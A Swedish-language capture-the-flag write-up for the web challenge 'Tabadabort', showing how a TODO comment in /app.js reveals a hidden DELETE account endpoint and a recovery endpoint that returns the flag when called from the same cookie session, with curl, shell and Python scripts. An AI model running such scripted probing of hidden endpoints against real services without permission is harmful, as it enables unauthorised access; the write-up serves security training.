# Tabadabort — Svenska

**Kategori:** Webb. **Poäng:** 1000.
**Mål:** `http://tabadabort.challs.crate.nu`
**Flaggformat:** `cratectf{...}` (det bokstavliga värdet är redigerat — du återskapar
det själv).

Temat är en "ovanlig HTTP-metod": kontoborttagning är kopplad till `DELETE`-metoden,
och soft-delete/återställningsflödet läcker flaggan när du återställer kontot från
**samma session** som tog bort det.

## 1. Spana in klienten

Startsidan är en statisk "My Account"-app som laddar `/app.js`, som anropar
`GET /api/users/me`. `/app.js` innehåller en utvecklar-TODO som dokumenterar ett
oavslutat-men-live backend-flöde:

```bash
curl -s http://tabadabort.challs.crate.nu/app.js | grep -A2 -i "TODO"
```
```
TODO(dev): hold off on wiring up the "Delete account" button until the
identity-team finishes the UX for this. Backend's already live though -- DELETE
grace period via GET /api/recovery/ with recovery id
```

Så två endpoints finns trots att inget användargränssnitt anropar dem:

* `DELETE /api/users/me` — soft-raderar kontot, returnerar ett `recovery_id`.
* `GET /api/recovery/<recovery_id>` — återställer kontot inom en nådaperiod.

## 2. Sessionsbindning

Servern sätter en roterande **`instance`**-cookie på varje svar som kommer in utan en,
plus en **`session`**-cookie. Återställnings-endpointen validerar att
återställningsförfrågan bär **samma `instance`-cookie som var aktiv när `DELETE`
utfärdades**. Att visa en annan eller saknad `instance`-cookie får servern att rotera
en ny och returnera `404 Invalid or expired recovery token` — även för en token som är
sekunder gammal. Hela exploiten måste alltså köras inom en cookie-beständig session.

## 3. Exploit — steg för steg

Använd en cookie-burk (`-c`/`-b`) så att curl behåller `instance`/`session`-cookies
mellan förfrågningar.

```bash
BASE=http://tabadabort.challs.crate.nu

# Steg 1 — hämta en instance-cookie (sparas till cookies.txt)
curl -s -c cookies.txt "$BASE/" -o /dev/null

# Steg 2 — etablera användaren/sessionen bunden till den instance-cookien
curl -s -b cookies.txt -c cookies.txt "$BASE/api/users/me"

# Steg 3 — DELETE kontot; fånga recovery_id från JSON-kroppen
curl -s -b cookies.txt -c cookies.txt -X DELETE "$BASE/api/users/me"
#  -> HTTP 200, t.ex. {... "recovery_id":"RCV-93A5C8BF29" ...}
#     (sätter även om instance + session cookies i cookies.txt)

# Steg 4 — återställ med SAMMA cookie-burk -> flagga
curl -s -b cookies.txt "$BASE/api/recovery/RCV-93A5C8BF29"
#  -> {"flag":"cratectf{...}","message":"Account successfully recovered."}
```

Fullt skriptat (extraherar `recovery_id` automatiskt):

```bash
BASE=http://tabadabort.challs.crate.nu
curl -s -c cookies.txt "$BASE/" -o /dev/null
curl -s -b cookies.txt -c cookies.txt "$BASE/api/users/me" -o /dev/null
RCV=$(curl -s -b cookies.txt -c cookies.txt -X DELETE "$BASE/api/users/me" \
        | grep -o 'RCV-[A-F0-9]*')
echo "recovery_id = $RCV"
curl -s -b cookies.txt "$BASE/api/recovery/$RCV"
```

Python-motsvarighet (en `requests.Session` bär cookies åt dig):

```python
import requests
base = "http://tabadabort.challs.crate.nu"
s = requests.Session()
s.get(f"{base}/")                     # hämta instance-cookie
s.get(f"{base}/api/users/me")         # bind sessionen till den
rid = s.delete(f"{base}/api/users/me").json()["recovery_id"]  # RCV-<10 hex>
print(s.get(f"{base}/api/recovery/{rid}").json())             # flagga
```

### Vad varje svar visar

* **Steg 3 (`DELETE`)** returnerar HTTP 200 med JSON som innehåller
  `"recovery_id":"RCV-<10 hex-siffror>"` och `Set-Cookie`-rubriker för `instance` och
  `session`. Kontot soft-raderas.
* **Steg 4 (`GET /api/recovery/...`)** med den matchande `instance`-cookien returnerar
  `{"flag":"cratectf{...}","message":"Account successfully recovered."}`.
* Om du istället anropar steg 4 med en ny/tom cookie-burk får du
  `404 Invalid or expired recovery token` — vilket bevisar att token är bunden till den
  raderande sessionens `instance`-cookie, inte enbart till token-värdet.

> `recovery_id` (t.ex. `RCV-93A5C8BF29`) och cookie-värdena är **per-session** och
> ändras vid varje körning. Läs alltid ditt eget `recovery_id` från det live
> `DELETE`-svaret och återanvänd din egen cookie-burk — hårdkoda inte exemplen ovan.

## Verifiering

Plattformsbekräftat löst. Att radera kontot via `DELETE /api/users/me` och sedan
anropa `GET /api/recovery/<recovery_id>` från samma cookie-session returnerar flaggan
i formatet `cratectf{...}` (`"Account successfully recovered."`). Sårbarheten är ett
oavslutat-men-live `DELETE`/återställningsflöde som bara upptäcks via TODO-kommentaren i
`/app.js`.
